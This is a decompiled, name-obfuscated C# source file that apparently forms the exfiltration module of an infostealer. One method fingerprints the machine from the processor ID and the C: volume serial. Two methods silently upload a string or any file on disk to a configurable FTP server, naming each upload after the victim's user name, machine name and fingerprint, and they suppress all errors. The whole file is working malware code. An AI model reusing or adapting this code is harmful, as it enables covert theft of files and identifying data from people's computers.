using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace kuMeqwHpurUBOD;

internal sealed class BhEjWEybWo
{
	public static string NJvLMAETTUmhx()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void ZoswELULsecbGti(string ieILcAJXWh = "URL", string lqdkZKqJmAxqHaQ = "USERNAME", string KNDNYFpTqv = "ACCESO", string YyEawpjnVWJ = "")
	{
		try
		{
			string text = NJvLMAETTUmhx();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ieILcAJXWh + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(lqdkZKqJmAxqHaQ, KNDNYFpTqv);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(YyEawpjnVWJ);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void UKsatUgrFHrdZ(string rXTLIvHUHDaCF = "URL", string HLMeKNFlbGFma = "USERNAME", string RtGNvFLPXIFnnwz = "ACCESO", string FsNymxUZdUYu = "")
	{
		try
		{
			string text = NJvLMAETTUmhx();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(rXTLIvHUHDaCF + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + "_" + Path.GetFileName(FsNymxUZdUYu));
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(HLMeKNFlbGFma, RtGNvFLPXIFnnwz);
			byte[] array = File.ReadAllBytes(FsNymxUZdUYu);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}
}
